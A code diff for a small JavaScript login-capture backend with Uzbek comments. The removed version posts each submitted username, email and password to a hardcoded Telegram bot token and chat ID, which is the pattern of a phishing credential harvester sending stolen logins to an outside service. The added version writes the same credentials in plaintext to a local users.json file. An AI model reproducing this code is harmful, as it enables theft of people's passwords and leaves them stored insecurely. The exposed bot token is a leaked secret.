@@ -1,36 +1,28 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const { Telegraf } = require('telegraf');
+const fs = require('fs');
+const path = require('path');
 
-const app = express();
-const port = 3000;
+module.exports = async (req, res) => {
+    if (req.method === 'POST') {
+        const { username, email, password } = req.body;
 
-// Telegram bot tokenini va chat ID-ni to'g'ridan-to'g'ri kiritish
-const bot = new Telegraf('7863435786:AAH4IsY-QHQa9lWOMJRQ6Dn7JmgIpemVm5c');  // O'zingizning bot tokeningizni joylashtiring
-const chatId = '7938269088';  // O'zingizning chat ID-ni joylashtiring
+        if (!username || !email || !password) {
+            return res.status(400).json({ success: false, message: 'Hamma maydonlarni to‘ldiring!' });
+        }
 
-// Middleware
-app.use(bodyParser.json());
+        const newUser = { username, email, password };
+        const filePath = path.join(__dirname, 'users.json');
 
-// Login ma'lumotlarini olish uchun endpoint
-app.post('/send-login-data', (req, res) => {
-    const { username, email, password } = req.body;
+        let users = [];
+        if (fs.existsSync(filePath)) {
+            const data = fs.readFileSync(filePath);
+            users = JSON.parse(data);
+        }
 
-    // Telegramga login va parolni yuborish
-    const message = `Yangi foydalanuvchi login ma'lumotlari:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
+        users.push(newUser);
+        fs.writeFileSync(filePath, JSON.stringify(users, null, 2));
 
-    // Botga yuborish
-    bot.telegram.sendMessage(chatId, message)  // To'g'ridan-to'g'ri chat ID-ga yuborish
-        .then(() => {
-            res.json({ success: true });
-        })
-        .catch((error) => {
-            console.error(error);
-            res.json({ success: false });
-        });
-});
-
-// Serverni ishga tushirish
-app.listen(port, () => {
-    console.log(`Server http://localhost:${port} manzilda ishlamoqda`);
-});
+        return res.status(200).json({ success: true, message: 'Foydalanuvchi qo‘shildi' });
+    } else {
+        return res.status(405).json({ success: false, message: 'Faqat POST ruxsat etiladi' });
+    }
+};
